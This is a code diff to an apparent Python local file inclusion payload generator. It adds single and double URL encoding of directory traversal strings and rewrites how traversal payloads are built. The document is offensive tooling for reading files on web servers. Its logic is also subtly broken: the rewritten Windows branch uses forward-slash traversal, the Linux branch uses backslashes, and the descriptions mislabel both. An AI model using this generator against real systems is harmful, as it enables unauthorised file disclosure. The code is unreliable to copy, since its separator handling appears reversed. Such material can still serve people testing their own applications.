@@ -7,7 +7,7 @@ Todo:
 Info:
     This class is used to generate payloads.
 """
-import sys
+import urllib.parse as urllib
 from general_func import GenralFunc
 from tqdm import tqdm
 
@@ -38,7 +38,33 @@ class PayloadLFI:
         if self.find_injection_points(self.url):
             GenralFunc.pprint("Generating Payloads", "success")
             self.directory_transversal()
-            
+            self.url_encode()
+            [print(self.exploit_payload_list[x] + " : " + self.exploit_payload_desc[x]) for x in range(0, len(self.exploit_payload_list))]
+
+
+    def url_encode(self):
+        temp_payload_holder = []
+        temp_payload_desc = []
+        for pay in range(0, len(self.exploit_payload_list)):
+            temp = str(self.exploit_payload_list[pay])
+            temp = temp.replace(".", "%2e")
+            temp = temp.replace("/", "%2f")
+            temp = temp.replace("\\", "%5c")
+            desc = self.exploit_payload_desc[pay] + " URL encoded"
+            temp_payload_holder.append(temp)
+            temp_payload_desc.append(desc)
+        for pay in range(0, len(temp_payload_holder)):
+            temp = self.exploit_payload_list[pay]
+            temp = temp.replace(".", "%252e")
+            temp = temp.replace("/", "%252f")
+            temp = temp.replace("\\", "%255c")
+            desc = self.exploit_payload_desc[pay] + " Doubled URL encoded"
+            temp_payload_holder.append(temp)
+            temp_payload_desc.append(desc)
+        for x in range(0, len(temp_payload_holder)):
+            self.exploit_payload_desc.append(temp_payload_desc[x])
+            self.exploit_payload_list.append(temp_payload_holder[x])
+
 
     def find_injection_points(self, url):
         """
@@ -67,24 +93,23 @@ class PayloadLFI:
         Gets the parameter and adds the ../../...... etc
         :return: Appends to the payload list
         """
-        for point in self.injection_points:
-            for x in range(0, 7):
-                if self.os == "windows" or self.os == "unknown":
-                    if x == 0:
-                        temp = point.format("/" + self.test_file)
-                        self.exploit_payload_list.append(temp)
-                    else:
-                        temp = point.format((x * "../") + self.test_file)
-                        self.exploit_payload_list.append(temp)
-                    self.exploit_payload_desc.append("Generic Directory transversal with " + str(x) + " backslashes")
-                if self.os == "linux" or self.os == "unknown":
-                    if x == 0:
-                        temp = point.format("/" + self.test_file)
-                        self.exploit_payload_list.append(temp)
-                    else:
-                        temp = point.format((x * "../") + self.test_file)
-                        self.exploit_payload_list.append(temp)
-                    self.exploit_payload_desc.append("Generic Directory transversal with " + str(x) + " backslashes")
+        for x in range(0, 7):
+            if self.os == "windows" or self.os == "unknown":
+                if x == 0:
+                    temp = ("/" + self.test_file)
+                    self.exploit_payload_list.append(temp)
+                else:
+                    temp = ((x * "../") + self.test_file)
+                    self.exploit_payload_list.append(temp)
+                self.exploit_payload_desc.append("Windows Generic Directory transversal with " + str(x) + " backslashes")
+            if self.os == "linux" or self.os == "unknown":
+                if x == 0:
+                    temp = ("\\" + self.test_file)
+                    self.exploit_payload_list.append(temp)
+                else:
+                    temp = (x * "..\\") + self.test_file
+                    self.exploit_payload_list.append(temp)
+                self.exploit_payload_desc.append("Linux Generic Directory transversal with " + str(x) + " backslashes")
 
 
     def display_payloads(self):
